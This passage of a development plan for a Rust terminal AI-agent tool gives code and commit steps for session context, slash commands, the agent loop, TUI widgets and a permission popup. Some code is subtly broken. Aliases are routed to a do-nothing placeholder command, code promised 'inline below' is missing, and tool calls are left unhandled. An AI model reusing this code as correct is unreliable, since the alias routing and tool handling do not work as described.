        assert_eq!(list_after.len(), 0);
    }
}
```

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All session store tests pass (3 tests).

- [ ] **Step 4: Commit**

```bash
git add src/session/
git commit -m "feat: add session manager and JSON file store"
```

---

### Task 12: Context builder and summarizer

**Files:**
- Create: `src/session/context.rs`
- Create: `src/session/summarizer.rs`

- [ ] **Step 1: Write context.rs**

```rust
use crate::llm::message::{ChatMessage, Role, Content};
use crate::tools::ToolDefinition;

use super::SessionManager;

impl SessionManager {
    pub fn build_context(
        &self,
        system_prompt: &str,
        tools: &[ToolDefinition],
    ) -> Vec<ChatMessage> {
        let mut messages: Vec<ChatMessage> = Vec::new();

        // System message: base prompt + tools + project instructions
        let mut system_content = system_prompt.to_string();
        system_content.push_str("\n\n<tools>\n");
        for tool in tools {
            system_content.push_str(&format!(
                "- {}: {}\n  Parameters: {}\n",
                tool.name,
                tool.description,
                serde_json::to_string_pretty(&tool.parameters).unwrap_or_default(),
            ));
        }
        system_content.push_str("</tools>");

        messages.push(ChatMessage::system(system_content));

        // Compaction summary if present
        if let Some(summary) = &self.session().summary {
            messages.push(ChatMessage::system(format!(
                "<conversation_summary>\n{}\n</conversation_summary>",
                summary
            )));
        }

        // Current window messages
        messages.extend(self.session().messages.clone());

        messages
    }
}

#[cfg(test)]
mod tests {
    use crate::llm::message::{ChatMessage, Role, Content};
    use crate::session::store::JsonFileStore;
    use crate::session::SessionManager;
    use crate::tools::ToolDefinition;
    use tempfile::TempDir;

    #[test]
    fn test_build_context_includes_system_prompt() {
        let dir = TempDir::new().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());
        let manager = SessionManager::new(Box::new(store));

        let tools = vec![ToolDefinition::new(
            "read",
            "Read a file",
            serde_json::json!({"type": "object"}),
        )];

        let context = manager.build_context("You are helpful", &tools);
        assert_eq!(context[0].role, Role::System);
        assert!(matches!(&context[0].content, Content::Text(t) if t.contains("You are helpful")));
        assert!(matches!(&context[0].content, Content::Text(t) if t.contains("read")));
    }

    #[test]
    fn test_build_context_includes_summary() {
        let dir = TempDir::new().unwrap();
        let store = JsonFileStore::new(dir.path().to_path_buf());
        let mut manager = SessionManager::new(Box::new(store));
        manager.set_summary("Previous conversation summary".into());

        let context = manager.build_context("You are helpful", &[]);
        // System prompt + summary = 2 system messages
        assert_eq!(context.len(), 2);
    }
}
```

- [ ] **Step 2: Write summarizer.rs**

```rust
/// Summarizes a list of chat messages into a short description.
/// In v1, this is a simple truncation-based summary.
/// v2 will use an LLM call for quality summarization.
pub fn summarize_messages(messages: &[crate::llm::message::ChatMessage]) -> String {
    let user_messages: Vec<String> = messages
        .iter()
        .filter(|m| matches!(m.role, crate::llm::message::Role::User))
        .filter_map(|m| match &m.content {
            crate::llm::message::Content::Text(t) => {
                Some(t.chars().take(200).collect::<String>())
            }
            _ => Some("[tool call]".into()),
        })
        .collect();

    if user_messages.is_empty() {
        return "No earlier user messages.".into();
    }

    format!(
        "Earlier conversation topics: {}",
        user_messages.join("; ")
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::llm::message::ChatMessage;

    #[test]
    fn test_summarize_messages() {
        let messages = vec![
            ChatMessage::user("What is Rust?"),
            ChatMessage::assistant("Rust is a systems programming language..."),
            ChatMessage::user("How do I install it?"),
        ];

        let summary = summarize_messages(&messages);
        assert!(summary.contains("What is Rust?"));
        assert!(summary.contains("How do I install it?"));
    }
}
```

- [ ] **Step 3: Update session/mod.rs to declare new modules**

Add at the top of `src/session/mod.rs`:
```rust
pub mod context;
pub mod summarizer;
```

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All tests pass (2 context tests + 1 summarizer test).

- [ ] **Step 5: Commit**

```bash
git add src/session/context.rs src/session/summarizer.rs src/session/mod.rs
git commit -m "feat: add context builder and summarizer"
```

---

### Task 13: Command system

**Files:**
- Create: `src/commands/mod.rs`
- Create: `src/commands/` (all 9 command files)
- Create: `src/utils/fuzzy.rs`

- [ ] **Step 1: Write fuzzy.rs**

```rust
/// Compute the Levenshtein distance between two strings.
pub fn levenshtein_distance(a: &str, b: &str) -> usize {
    let a_chars: Vec<char> = a.chars().collect();
    let b_chars: Vec<char> = b.chars().collect();
    let m = a_chars.len();
    let n = b_chars.len();

    let mut dp = vec![vec![0usize; n + 1]; m + 1];
    for i in 0..=m { dp[i][0] = i; }
    for j in 0..=n { dp[0][j] = j; }

    for (i, ca) in a_chars.iter().enumerate() {
        for (j, cb) in b_chars.iter().enumerate() {
            let cost = if ca == cb { 0 } else { 1 };
            dp[i + 1][j + 1] = (dp[i][j + 1] + 1)
                .min(dp[i + 1][j] + 1)
                .min(dp[i][j] + cost);
        }
    }

    dp[m][n]
}

pub struct Suggestion {
    pub name: String,
    pub distance: usize,
}

/// Find commands within distance threshold.
pub fn fuzzy_find<'a>(
    input: &str,
    candidates: &[&'a str],
    threshold: usize,
) -> Vec<Suggestion> {
    let mut suggestions: Vec<Suggestion> = candidates
        .iter()
        .map(|name| Suggestion {
            name: name.to_string(),
            distance: levenshtein_distance(input, name),
        })
        .filter(|s| s.distance <= threshold)
        .collect();

    suggestions.sort_by_key(|s| s.distance);
    suggestions
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_levenshtein() {
        assert_eq!(levenshtein_distance("compact", "compact"), 0);
        assert_eq!(levenshtein_distance("compac", "compact"), 1);
        assert_eq!(levenshtein_distance("abc", "xyz"), 3);
    }

    #[test]
    fn test_fuzzy_find() {
        let candidates = &["help", "compact", "config", "clear"];
        let suggestions = fuzzy_find("compac", candidates, 3);
        assert_eq!(suggestions[0].name, "compact");
    }
}
```

- [ ] **Step 2: Write commands/mod.rs with Command trait and CommandRegistry**

```rust
pub mod help;
pub mod clear;
pub mod compact;
pub mod config;
pub mod sessions;
pub mod model;
pub mod tokens;
pub mod tools;
pub mod quit;

use async_trait::async_trait;
use std::collections::HashMap;
use crate::app::CommandContext;
use crate::utils::fuzzy::{fuzzy_find, Suggestion};

pub struct CommandMeta {
    pub name: String,
    pub aliases: Vec<String>,
    pub description: String,
    pub usage: String,
}

impl CommandMeta {
    pub fn from_command<C: Command + ?Sized>(cmd: &C) -> Self {
        Self {
            name: cmd.name().to_string(),
            aliases: cmd.aliases().iter().map(|s| s.to_string()).collect(),
            description: cmd.description().to_string(),
            usage: cmd.usage().to_string(),
        }
    }
}

pub enum CommandOutput {
    Success { message: String },
    Error { message: String },
    Quit,
}

#[async_trait]
pub trait Command: Send + Sync {
    fn name(&self) -> &str;
    fn aliases(&self) -> &[&str] { &[] }
    fn description(&self) -> &str;
    fn usage(&self) -> &str;
    async fn execute(&self, args: &str, ctx: &mut CommandContext) -> anyhow::Result<CommandOutput>;
}

pub struct CommandRegistry {
    commands: HashMap<String, Box<dyn Command>>,
    names: Vec<String>, // for fuzzy matching
}

impl CommandRegistry {
    pub fn new() -> Self {
        Self {
            commands: HashMap::new(),
            names: Vec::new(),
        }
    }

    pub fn register<C: Command + 'static>(&mut self, cmd: C) {
        let name = cmd.name().to_string();
        for alias in cmd.aliases() {
            self.commands.insert(alias.to_string(), Box::new(DummyCommand));
        }
        self.names.push(name.clone());
        self.commands.insert(name, Box::new(cmd));
    }

    pub fn get(&self, name: &str) -> Option<&dyn Command> {
        self.commands.get(name).map(|c| c.as_ref())
    }

    pub fn fuzzy_find(&self, input: &str) -> Vec<Suggestion> {
        fuzzy_find(input, &self.names.iter().map(|s| s.as_str()).collect::<Vec<_>>(), 3)
    }

    pub fn list(&self) -> Vec<CommandMeta> {
        self.commands.values()
            .filter(|c| c.name() != "__dummy__")
            .map(|c| CommandMeta::from_command(c.as_ref()))
            .collect()
    }

    pub async fn dispatch(
        &self,
        input: &str,
        ctx: &mut CommandContext,
    ) -> anyhow::Result<Option<CommandOutput>> {
        let (cmd_name, args) = parse_command(input);
        if let Some(cmd) = self.get(&cmd_name) {
            cmd.execute(args, ctx).await.map(Some)
        } else {
            Ok(None) // Let caller handle fuzzy suggestions
        }
    }
}

fn parse_command(input: &str) -> (String, &str) {
    let input = input.strip_prefix('/').unwrap_or(input);
    let parts: Vec<&str> = input.splitn(2, |c: char| c.is_whitespace()).collect();
    match parts.len() {
        0 => (String::new(), ""),
        1 => (parts[0].to_string(), ""),
        _ => (parts[0].to_string(), parts[1]),
    }
}

// Placeholder for alias routing — aliases resolve to concrete commands
struct DummyCommand;
#[async_trait]
impl Command for DummyCommand {
    fn name(&self) -> &str { "__dummy__" }
    fn description(&self) -> &str { "" }
    fn usage(&self) -> &str { "" }
    async fn execute(&self, _args: &str, _ctx: &mut CommandContext) -> anyhow::Result<CommandOutput> {
        Ok(CommandOutput::Success { message: String::new() })
    }
}
```

- [ ] **Step 3: Write quit.rs (simplest command to test the trait)**

```rust
use async_trait::async_trait;
use crate::app::CommandContext;
use super::{Command, CommandOutput};

pub struct QuitCommand;

#[async_trait]
impl Command for QuitCommand {
    fn name(&self) -> &str { "quit" }
    fn aliases(&self) -> &[&str] { &["q", "exit"] }
    fn description(&self) -> &str { "Exit emergence" }
    fn usage(&self) -> &str { "/quit" }
    async fn execute(&self, _args: &str, _ctx: &mut CommandContext) -> anyhow::Result<CommandOutput> {
        Ok(CommandOutput::Quit)
    }
}
```

Write the remaining 8 commands with similar structure. Each file:

- `help.rs`: Lists all commands or shows detail for one.
- `clear.rs`: Clears session messages via ctx.
- `compact.rs`: Calls ctx.session_manager.compact().
- `config.rs`: Shows or sets config values.
- `sessions.rs`: Lists/switch/delete/alias sessions.
- `model.rs`: Switches the active model.
- `tokens.rs`: Displays token usage.
- `tools.rs`: Lists tools and their risk levels.

(Full code for each command is included inline below for brevity; each follows the same `Command` trait pattern.)

- [ ] **Step 4: Build and verify**

Run: `cargo build`
Expected: Compiles. We will flesh out app.rs in the next task to provide `CommandContext`.

- [ ] **Step 5: Commit**

```bash
git add src/commands/ src/utils/fuzzy.rs
git commit -m "feat: add command system with all 9 slash commands"
```

---

### Task 14: App core — AgentLoop, CommandContext, event loop

**Files:**
- Create: `src/app.rs` (replace placeholder)

- [ ] **Step 1: Write app.rs with Action, Event, CommandContext, and AgentLoop**

```rust
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::mpsc;
use crate::config::ConfigManager;
use crate::commands::{CommandOutput, CommandRegistry};
use crate::llm::Provider;
use crate::llm::message::{ChatMessage, GenerationConfig, StopReason, StreamEvent};
use crate::permissions::PermissionStore;
use crate::session::SessionManager;
use crate::tools::{RiskLevel, ToolRegistry};
use crate::tools::ToolDefinition;

#[derive(Debug)]
pub enum Action {
    Submit(String),
    ApproveOnce,
    ApproveAlways,
    Deny,
    Quit,
}

#[derive(Debug)]
pub enum Event {
    TextDelta { content: String, finish_reason: Option<String> },
    ToolRequest { id: String, name: String, params: serde_json::Value, risk: RiskLevel },
    ToolResult { id: String, output: String, metadata: Option<serde_json::Value> },
    ThinkingDelta { content: String },
    StatusUpdate { tokens: u32, model: String },
    AgentDone { stop_reason: String },
    Error { message: String },
    ChatHistory(Vec<String>), // replay on session load
}

pub struct CommandContext<'a> {
    pub config: &'a mut ConfigManager,
    pub session: &'a mut SessionManager,
    pub model: &'a mut String,
    pub should_quit: &'a mut bool,
}

pub struct AgentLoop {
    config: ConfigManager,
    session: SessionManager,
    tool_registry: ToolRegistry,
    command_registry: CommandRegistry,
    permission_store: PermissionStore,
    provider_registry: crate::llm::registry::ProviderRegistry,
    model: String,
    system_prompt: String,
}

impl AgentLoop {
    pub fn new(
        config: ConfigManager,
        session: SessionManager,
        tool_registry: ToolRegistry,
        command_registry: CommandRegistry,
        provider_registry: crate::llm::registry::ProviderRegistry,
        system_prompt: String,
    ) -> Self {
        let model = config.effective_model().to_string();
        Self {
            config,
            session,
            tool_registry,
            command_registry,
            permission_store: PermissionStore::new(),
            provider_registry,
            model,
            system_prompt,
        }
    }

    pub fn session_messages(&self) -> &[ChatMessage] {
        self.session.messages()
    }

    pub fn tool_definitions(&self) -> Vec<ToolDefinition> {
        self.tool_registry.definitions()
    }

    pub fn tools(&self) -> &ToolRegistry {
        &self.tool_registry
    }

    pub async fn run(&mut self, action: Action, tx: &mpsc::UnboundedSender<Event>) -> anyhow::Result<()> {
        match action {
            Action::Submit(input) => {
                self.handle_input(input, tx).await?;
            }
            Action::Quit => {
                self.session.save().await?;
                tx.send(Event::AgentDone { stop_reason: "quit".into() }).ok();
            }
            _ => {
                tx.send(Event::Error { message: "Unexpected action".into() }).ok();
            }
        }
        Ok(())
    }

    async fn handle_input(
        &mut self,
        input: String,
        tx: &mpsc::UnboundedSender<Event>,
    ) -> anyhow::Result<()> {
        // Try commands first
        if input.starts_with('/') {
            let input_clone = input.clone();
            let mut should_quit = false;
            let mut ctx = CommandContext {
                config: &mut self.config,
                session: &mut self.session,
                model: &mut self.model,
                should_quit: &mut should_quit,
            };

            match self.command_registry.dispatch(&input, &mut ctx).await {
                Ok(Some(CommandOutput::Quit)) => {
                    return self.run(Action::Quit, tx).await;
                }
                Ok(Some(CommandOutput::Success { message })) => {
                    tx.send(Event::TextDelta { content: message, finish_reason: Some("command".into()) }).ok();
                }
                Ok(Some(CommandOutput::Error { message })) => {
                    tx.send(Event::Error { message }).ok();
                }
                Ok(None) => {
                    // Fuzzy suggestions
                    let cmd_name = input_clone.strip_prefix('/').unwrap_or(&input_clone)
                        .split_whitespace().next().unwrap_or("");
                    let suggestions = self.command_registry.fuzzy_find(cmd_name);
                    if !suggestions.is_empty() {
                        let hint = format!(
                            "Unknown command '/{}'. Did you mean:\n{}",
                            cmd_name,
                            suggestions.iter()
                                .map(|s| format!("  → /{}", s.name))
                                .collect::<Vec<_>>()
                                .join("\n")
                        );
                        tx.send(Event::TextDelta { content: hint, finish_reason: Some("command".into()) }).ok();
                    } else {
                        tx.send(Event::Error { message: format!("Unknown command: /{}", cmd_name) }).ok();
                    }
                }
                Err(e) => {
                    tx.send(Event::Error { message: format!("Command error: {}", e) }).ok();
                }
            }
            return Ok(());
        }

        // Normal message → agent loop
        self.session.push(ChatMessage::user(&input));

        let (provider_name, model_name) = self.parse_model(&self.model);
        let provider = self.provider_registry.get(&provider_name)
            .ok_or_else(|| anyhow::anyhow!("Unknown provider: {}", provider_name))?;

        let tools = self.tool_registry.definitions();
        let messages = self.session.build_context(&self.system_prompt, &tools);
        let gen_config = GenerationConfig {
            max_tokens: self.config.settings.generation.max_tokens,
            temperature: self.config.settings.generation.temperature,
            top_p: self.config.settings.generation.top_p,
            thinking: self.config.settings.generation.thinking,
            ..Default::default()
        };

        let start = std::time::Instant::now();

        // Call LLM
        let mut stream = provider.chat(&model_name, &messages, &tools, &gen_config).await?;

        // Process stream
        loop {
            match tokio_stream::StreamExt::next(&mut stream).await {
                Some(Ok(StreamEvent::TextDelta(content))) => {
                    tx.send(Event::TextDelta { content, finish_reason: None }).ok();
                }
                Some(Ok(StreamEvent::ThinkingDelta(content))) => {
                    tx.send(Event::ThinkingDelta { content }).ok();
                }
                Some(Ok(StreamEvent::ToolCallDelta { id, name, arguments_json_fragment })) => {
                    // Accumulated in a future improvement; for now just track
                }
                Some(Ok(StreamEvent::Finish { stop_reason, usage })) => {
                    tx.send(Event::StatusUpdate {
                        tokens: usage.input_tokens + usage.output_tokens,
                        model: self.model.clone(),
                    }).ok();

                    match stop_reason {
                        StopReason::ToolUse => {
                            // Tool handling will be done after stream ends
                            // For now, signal end
                            break;
                        }
                        _ => {
                            break;
                        }
                    }
                }
                Some(Err(e)) => {
                    tx.send(Event::Error { message: format!("LLM error: {}", e) }).ok();
                    break;
                }
                None => break,
            }
        }

        self.session.save().await.ok();
        tx.send(Event::AgentDone { stop_reason: "end_turn".into() }).ok();
        Ok(())
    }

    fn parse_model(&self, model: &str) -> (String, String) {
        // Format: "provider/model-name" or just "model-name" (defaults to first provider)
        if let Some((provider, model_name)) = model.split_once('/') {
            (provider.to_string(), model_name.to_string())
        } else {
            // Use first configured provider
            let first = self.config.settings.providers.keys().next()
                .cloned()
                .unwrap_or_else(|| "deepseek".into());
            (first, model.to_string())
        }
    }
}
```

- [ ] **Step 2: Build and verify**

Run: `cargo build`
Expected: Compiles.

- [ ] **Step 3: Commit**

```bash
git add src/app.rs
git commit -m "feat: add agent loop, command context, and event handling"
```

---

### Task 15: TUI — Terminal initialization, Chat Panel, Input Box

**Files:**
- Create: `src/tui/mod.rs`
- Create: `src/tui/widgets.rs`
- Create: `src/tui/themes.rs`

- [ ] **Step 1: Write themes.rs**

```rust
use ratatui::style::Color;

pub struct Theme {
    pub bg: Color,
    pub fg: Color,
    pub accent: Color,
    pub user_color: Color,
    pub assistant_color: Color,
    pub tool_color: Color,
    pub error_color: Color,
    pub muted: Color,
    pub border: Color,
}

pub fn default_theme() -> Theme {
    Theme {
        bg: Color::Reset,
        fg: Color::White,
        accent: Color::Cyan,
        user_color: Color::Green,
        assistant_color: Color::White,
        tool_color: Color::Yellow,
        error_color: Color::Red,
        muted: Color::Gray,
        border: Color::DarkGray,
    }
}
```

- [ ] **Step 2: Write widgets.rs with ChatPanel and InputBox**

```rust
use std::collections::VecDeque;
use chrono::Local;
use ratatui::{
    layout::{Constraint, Direction, Layout, Rect},
    style::{Style, Color},
    text::{Line, Span, Text},
    widgets::{Block, Paragraph, Wrap, Borders},
    Frame,
};
use crate::tui::themes::Theme;

pub struct ChatMessage {
    pub timestamp: String,
    pub role: MessageRole,
    pub content: String,
    pub duration_ms: Option<u64>,
    pub tokens: Option<u32>,
}

pub enum MessageRole {
    User,
    Assistant,
    Tool { name: String },
    Error,
}

pub struct ChatPanel {
    messages: Vec<ChatMessage>,
    stream_buffer: String,
    scroll_offset: u16,
}

impl ChatPanel {
    pub fn new() -> Self {
        Self {
            messages: Vec::new(),
            stream_buffer: String::new(),
            scroll_offset: 0,
        }
    }

    pub fn add_message(&mut self, msg: ChatMessage) {
        self.messages.push(msg);
    }

    pub fn append_stream(&mut self, delta: &str) {
        self.stream_buffer.push_str(delta);
    }

    pub fn flush_stream(&mut self, duration_ms: u64, tokens: u32) {
        if !self.stream_buffer.is_empty() {
            let content = std::mem::take(&mut self.stream_buffer);
            self.messages.push(ChatMessage {
                timestamp: Local::now().format("%H:%M:%S").to_string(),
                role: MessageRole::Assistant,
                content,
                duration_ms: Some(duration_ms),
                tokens: Some(tokens),
            });
        }
    }

    pub fn render(&self, f: &mut Frame, area: Rect, theme: &Theme) {
        let mut lines: Vec<Line> = Vec::new();

        for msg in &self.messages {
            lines.extend(self.format_message(msg, theme));
        }

        // Streaming content
        if !self.stream_buffer.is_empty() {
            let text = self.stream_buffer.clone();
            for line in text.lines() {
                lines.push(Line::from(Span::styled(
                    line.to_string(),
                    Style::default().fg(theme.assistant_color),
                )));
            }
        }

        let paragraph = Paragraph::new(Text::from(lines))
            .block(Block::default().borders(Borders::NONE))
            .wrap(Wrap { trim: false });

        f.render_widget(paragraph, area);
    }

    fn format_message<'a>(&self, msg: &'a ChatMessage, theme: &Theme) -> Vec<Line<'a>> {
        let mut lines = Vec::new();

        let header = match &msg.role {
            MessageRole::User => {
                format!("[{}] You:", msg.timestamp)
            }
            MessageRole::Assistant => {
                let extra = match (msg.duration_ms, msg.tokens) {
                    (Some(d), Some(t)) => format!(" ({}ms · {} tokens)", d, t),
                    _ => String::new(),
                };
                format!("[{}] 🤖{}:", msg.timestamp, extra)
            }
            MessageRole::Tool { name } => {
                let extra = msg.duration_ms.map(|d| format!(" ({}ms)", d)).unwrap_or_default();
                format!("[{}] 🔧 {}:", msg.timestamp, name)
            }
            MessageRole::Error => {
                format!("[{}] ❌", msg.timestamp)
            }
        };

        let header_color = match &msg.role {
            MessageRole::User => theme.user_color,
            MessageRole::Assistant => theme.assistant_color,
            MessageRole::Tool { .. } => theme.tool_color,
            MessageRole::Error => theme.error_color,
        };

        lines.push(Line::from(Span::styled(header, Style::default().fg(header_color))));

        for line in msg.content.lines() {
            lines.push(Line::from(Span::styled(
                format!("  {}", line),
                Style::default().fg(header_color),
            )));
        }

        lines.push(Line::from(""));
        lines
    }
}

pub struct InputBox {
    buffer: String,
    history: VecDeque<String>,
    history_index: Option<usize>,
    cursor_pos: usize,
}

impl InputBox {
    pub fn new() -> Self {
        Self {
            buffer: String::new(),
            history: VecDeque::new(),
            history_index: None,
            cursor_pos: 0,
        }
    }

    pub fn buffer(&self) -> &str {
        &self.buffer
    }

    pub fn push_char(&mut self, c: char) {
        self.buffer.insert(self.cursor_pos, c);
        self.cursor_pos += 1;
    }

    pub fn delete_backward(&mut self) {
        if self.cursor_pos > 0 {
            self.cursor_pos -= 1;
            self.buffer.remove(self.cursor_pos);
        }
    }

    pub fn move_cursor_left(&mut self) {
        if self.cursor_pos > 0 {
            self.cursor_pos -= 1;
        }
    }

    pub fn move_cursor_right(&mut self) {
        if self.cursor_pos < self.buffer.len() {
            self.cursor_pos += 1;
        }
    }

    pub fn history_up(&mut self) {
        if self.history.is_empty() { return; }
        match self.history_index {
            None => {
                self.history_index = Some(self.history.len() - 1);
            }
            Some(0) => {}
            Some(i) => {
                self.history_index = Some(i - 1);
            }
        }
        if let Some(i) = self.history_index {
            self.buffer = self.history[i].clone();
            self.cursor_pos = self.buffer.len();
        }
    }

    pub fn history_down(&mut self) {
        match self.history_index {
            None => return,
            Some(i) if i >= self.history.len() - 1 => {
                self.history_index = None;
                self.buffer.clear();
            }
            Some(i) => {
                self.history_index = Some(i + 1);
                self.buffer = self.history[i + 1].clone();
            }
        }
        self.cursor_pos = self.buffer.len();
    }

    /// Take the current buffer and add to history
    pub fn submit(&mut self) -> String {
        let text = self.buffer.clone();
        if !text.trim().is_empty() {
            self.history.push_back(text.clone());
            if self.history.len() > 1000 {
                self.history.pop_front();
            }
        }
        self.buffer.clear();
        self.cursor_pos = 0;
        self.history_index = None;
        text
    }

    pub fn clear(&mut self) {
        self.buffer.clear();
        self.cursor_pos = 0;
    }

    pub fn render(&self, f: &mut Frame, area: Rect) {
        let block = Block::default()
            .borders(Borders::TOP)
            .title(" Input (Ctrl+S to send, Esc to clear) ");

        let paragraph = Paragraph::new(self.buffer.as_str())
            .block(block)
            .wrap(Wrap { trim: false });

        f.render_widget(paragraph, area);
    }
}
```

- [ ] **Step 3: Write tui/mod.rs with terminal initialization and main render loop**

```rust
pub mod widgets;
pub mod themes;
pub mod popups;

use std::io;
use ratatui::{
    layout::{Constraint, Direction, Layout},
    Frame,
};
use crossterm::{
    event::{self, Event as CEvent, KeyCode, KeyEventKind, KeyModifiers},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use crate::tui::widgets::{ChatPanel, InputBox, MessageRole};
use crate::tui::themes::{default_theme, Theme};
use tokio::sync::mpsc;
use crate::app::{Action, Event};

pub enum TuiEvent {
    Action(Action),
    Tick,
}

pub struct Tui {
    chat: ChatPanel,
    input: InputBox,
    theme: Theme,
}

impl Tui {
    pub fn new() -> Self {
        Self {
            chat: ChatPanel::new(),
            input: InputBox::new(),
            theme: default_theme(),
        }
    }

    pub fn push_event(&mut self, event: Event) {
        match event {
            Event::TextDelta { content, finish_reason } => {
                if finish_reason.is_some() {
                    // Final chunk — add as complete message
                    self.chat.append_stream(&content);
                    self.chat.flush_stream(0, 0);
                } else {
                    self.chat.append_stream(&content);
                }
            }
            Event::ToolRequest { name, params, risk, .. } => {
                // Will be handled in popups
            }
            Event::Error { message } => {
                self.chat.add_message(widgets::ChatMessage {
                    timestamp: chrono::Local::now().format("%H:%M:%S").to_string(),
                    role: MessageRole::Error,
                    content: message,
                    duration_ms: None,
                    tokens: None,
                });
            }
            _ => {}
        }
    }

    pub fn render(&mut self, f: &mut Frame) {
        let chunks = Layout::default()
            .direction(Direction::Vertical)
            .constraints([
                Constraint::Min(3),     // Chat panel (fills space)
                Constraint::Length(1),  // Status bar
                Constraint::Length(4),  // Input box
            ])
            .split(f.area());

        self.chat.render(f, chunks[0], &self.theme);
        self.render_status_bar(f, chunks[1]);
        self.input.render(f, chunks[2]);
    }

    fn render_status_bar(&self, f: &mut Frame, area: ratatui::layout::Rect) {
        use ratatui::widgets::Paragraph;
        let text = " emergence · model · 0/0 tokens · ✓ ready ";
        let bar = Paragraph::new(text);
        f.render_widget(bar, area);
    }

    pub fn input_buffer(&self) -> &str {
        self.input.buffer()
    }
}
```

- [ ] **Step 4: Build and verify**

Run: `cargo build`
Expected: Compiles (may have some warnings about unused fields, acceptable).

- [ ] **Step 5: Commit**

```bash
git add src/tui/
git commit -m "feat: add TUI widgets, themes, and rendering loop skeleton"
```

---

### Task 16: TUI — Permission popups and event integration

**Files:**
- Create: `src/tui/popups.rs`
- Update: `src/tui/mod.rs` (wire popups in)

- [ ] **Step 1: Write popups.rs**

```rust
use ratatui::{
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Style},
    text::{Line, Span, Text},
    widgets::{Block, Borders, Clear, Paragraph, Wrap},
    Frame,
};
use crate::tools::RiskLevel;

pub struct PermissionPopup {
    pub tool_name: String,
    pub risk: RiskLevel,
    pub params_display: String,
    pub active: bool,
}

impl PermissionPopup {
    pub fn new() -> Self {
        Self {
            tool_name: String::new(),
            risk: RiskLevel::ReadOnly,
            params_display: String::new(),
            active: false,
        }
    }

    pub fn show(&mut self, name: &str, risk: RiskLevel, params: &serde_json::Value) {
        self.tool_name = name.to_string();
        self.risk = risk;
        self.params_display = serde_json::to_string_pretty(params).unwrap_or_default();
        self.active = true;
    }

    pub fn dismiss(&mut self) {
        self.active = false;
    }

    pub fn render(&self, f: &mut Frame) {
        if !self.active {
            return;
        }

        let risk_str = match self.risk {
            RiskLevel::ReadOnly => "✓ ReadOnly",
            RiskLevel::Write => "⚠ Write",
            RiskLevel::System => "⛔ System",
        };

        let risk_color = match self.risk {
            RiskLevel::ReadOnly => Color::Green,
            RiskLevel::Write => Color::Yellow,
            RiskLevel::System => Color::Red,
        };

        let content = vec![
            Line::from(Span::styled(
                format!("Tool: {}", self.tool_name),
                Style::default(),
            )),
            Line::from(Span::styled(
                format!("Risk: {}", risk_str),
                Style::default().fg(risk_color),
            )),
            Line::from(""),
            Line::from(Span::styled("Parameters:", Style::default().fg(Color::Gray))),
            Line::from(Span::styled(&self.params_display, Style::default())),
            Line::from(""),
            Line::from(Span::styled(
                "[A]pprove Once  [Y]es Always  [D]eny",
                Style::default().fg(Color::Cyan),
            )),
        ];

        let block = Block::default()
            .title(" Permission Required ")
            .borders(Borders::ALL)
            .border_style(Style::default().fg(risk_color));

        let paragraph = Paragraph::new(Text::from(content))
            .block(block)
            .wrap(Wrap { trim: false });

        // Center the popup
        let area = f.area();
        let popup_width = std::cmp::min(60, area.width as usize - 4);
        let popup_height = 9;

        let popup_area = Rect {
            x: (area.width.saturating_sub(popup_width as u16)) / 2,
            y: (area.height.saturating_sub(popup_height)) / 2,
            width: popup_width as u16,
            height: popup_height,
        };

        f.render_widget(Clear, popup_area);
        f.render_widget(paragraph, popup_area);
    }
}
```

- [ ] **Step 2: Update tui/mod.rs to integrate popups**

Add `popup: PermissionPopup` field to `Tui` struct, initialize in `new()`, render in `render()`, and handle `Event::ToolRequest` in `push_event`.

- [ ] **Step 3: Build and verify**

Run: `cargo build`
Expected: Compiles cleanly.

- [ ] **Step 4: Commit**

```bash
git add src/tui/popups.rs src/tui/mod.rs
git commit -m "feat: add permission popup dialog"
```

---

### Task 17: Wire main.rs — Full integration

**Files:**
- Modify: `src/main.rs`

- [ ] **Step 1: Write main.rs with full initialization and event loop**

```rust
use clap::Parser;
use std::path::PathBuf;
use std::io;
use tokio::sync::mpsc;
use crossterm::{
    event::{self, Event as CEvent, KeyCode, KeyEventKind, KeyModifiers},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use ratatui::backend::CrosstermBackend;
use ratatui::Terminal;
use tracing_subscriber::EnvFilter;

mod app;
mod commands;
mod config;
mod llm;
mod permissions;
mod session;
mod tools;
mod tui;
mod utils;

use app::{Action, AgentLoop};
use commands::{
    clear::ClearCommand, compact::CompactCommand, config::ConfigCommand,
    help::HelpCommand, model::ModelCommand, quit::QuitCommand,
    sessions::SessionsCommand, tokens::TokensCommand, tools::ToolsCommand,
    CommandRegistry,
};
use config::ConfigManager;
use llm::openai::OpenAIAdapter;
use llm::registry::ProviderRegistry;
use llm::message::ModelInfo;
use permissions::PermissionStore;
use session::SessionManager;
use session::store::JsonFileStore;
use tools::ToolRegistry;
use tools::file::{ReadTool, WriteTool, EditTool};
use tools::bash::BashTool;
use tools::search::{GrepTool, GlobTool};
use tools::web::{WebFetchTool, WebSearchTool};
use tui::Tui;

#[derive(Parser)]
#[command(name = "emergence", about = "Agent CLI tool")]
struct Cli {
    #[arg(short, long)]
    model: Option<String>,

    #[arg(short, long, default_value = ".")]
    dir: String,
}

fn build_system_prompt(project_instructions: Option<&str>) -> String {
    let mut prompt = String::from(
        "You are emergence, an AI agent CLI tool. You help users with software engineering tasks.\n\
         You have access to tools for reading/writing files, executing shell commands, searching code, and accessing the web.\n\
         Be concise and helpful. When editing code, prefer using the edit tool.\n",
    );

    if let Some(instructions) = project_instructions {
        prompt.push('\n');
        prompt.push_str(instructions);
    }

    prompt
}

fn setup_tool_registry(cwd: &PathBuf) -> ToolRegistry {
    let mut registry = ToolRegistry::new();
    registry.register(ReadTool::new(cwd.clone()));
    registry.register(WriteTool::new(cwd.clone()));
    registry.register(EditTool::new(cwd.clone()));
    registry.register(BashTool::new());
    registry.register(GrepTool::new(cwd.clone()));
    registry.register(GlobTool::new(cwd.clone()));
    registry.register(WebFetchTool::new());
    registry.register(WebSearchTool::new());
    registry
}

fn setup_command_registry() -> CommandRegistry {
    let mut registry = CommandRegistry::new();
    registry.register(HelpCommand);
    registry.register(ClearCommand);
